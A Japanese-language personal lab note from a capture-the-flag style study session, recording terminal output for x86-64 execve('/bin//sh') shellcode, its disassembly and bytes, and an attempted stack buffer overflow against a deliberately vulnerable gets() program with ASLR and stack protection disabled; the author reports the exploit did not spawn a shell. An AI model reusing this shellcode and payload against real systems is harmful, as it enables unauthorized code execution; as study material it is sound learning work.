# execve 気づき
- execveのシステムコール番号は59
- ./a.out でシェルが起動する(！！！！)割と感動
- このちょっとのコードで起動するんだなぁという新鮮さがある
```
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ grep execve /usr/include/x86_64-linux-gnu/asm/unistd_64.h
#define __NR_execve 59
#define __NR_execveat 322
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ echo "/bin//sh" | od -tx8z
0000000 68732f2f6e69622f 000000000000000a  >/bin//sh.<
0000011
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ vim execve.s
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ gcc -nostdlib execve.s
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ ./a.out
$ id
uid=1000(kaito) gid=1000(kaito) groups=1000(kaito),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
$ ^C
$ exit
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ objdump -M intel -d a.out

a.out:     file format elf64-x86-64


Disassembly of section .text:

0000000000000241 <_start>:
 241:	48 31 d2             	xor    rdx,rdx
 244:	52                   	push   rdx
 245:	48 b8 2f 62 69 6e 2f 	movabs rax,0x68732f2f6e69622f
 24c:	2f 73 68 
 24f:	50                   	push   rax
 250:	48 89 e7             	mov    rdi,rsp
 253:	52                   	push   rdx
 254:	57                   	push   rdi
 255:	48 89 e6             	mov    rsi,rsp
 258:	48 8d 42 3b          	lea    rax,[rdx+0x3b]
 25c:	0f 05                	syscall 
```

- 続いてシェルコートの実行(exploitをしようとしたがシェルが起動できなかった。分からないのでうーんといった感じ)
```
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ vim bof.c
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ sudo sysctl -w kernel.randomize_va_space=0
[sudo] password for kaito: 
kernel.randomize_va_space = 0
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ gcc -fno-stack-protector -z execstack bof.c
bof.c: In function ‘main’:
bof.c:9:2: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
  gets(buf);
  ^~~~
  fgets
/tmp/ccp1EsWl.o: In function `main':
bof.c:(.text+0x3c): warning: the `gets' function is dangerous and should not be used.
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ ./a.out
buf = 0x7fffffffdd80
AAAA
AAAA
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ sudo sysctl -w kernel.randomize_va_space=2
kernel.randomize_va_space = 2
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ vim exploit.py
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ python exploit.py 0x7fffffffe5e0 100
[+] read: 'buf = 0x7fffc78bf1b0\n'
[+] read: 'H1\xd2RH\xb8/bin//shPH\x89\xe7RWH\x89\xe6H\x8dB;\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe0\xe5\xff\xff\xff\x7f\n'
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ python exploit.py 0x7fffffffe5d0 100
[+] read: 'buf = 0x7ffc0cb2c0a0\n'
[+] read: 'H1\xd2RH\xb8/bin//shPH\x89\xe7RWH\x89\xe6H\x8dB;\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\xe5\xff\xff\xff\x7f\n'
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ python exploit.py 0x7fffffffe5d0 100
[+] read: 'buf = 0x7ffef91b1ae0\n'
[+] read: 'H1\xd2RH\xb8/bin//shPH\x89\xe7RWH\x89\xe6H\x8dB;\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\xe5\xff\xff\xff\x7f\n'
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ vim exploit.py
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ vim exploit_.py
kaito@kaito-ThinkPad-X240:~/projects/ctf/_lab/x64overflow$ python exploit_.py 0x7fffffffe5d0 100
[+] read: 'buf = 0x7ffe07b012f0\n'
[+] read: 'H1\xd2RH\xb8/bin//shPH\x89\xe7RWH\x89\xe6H\x8dB;\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\xe5\xff\xff\xff\x7f\n'
```
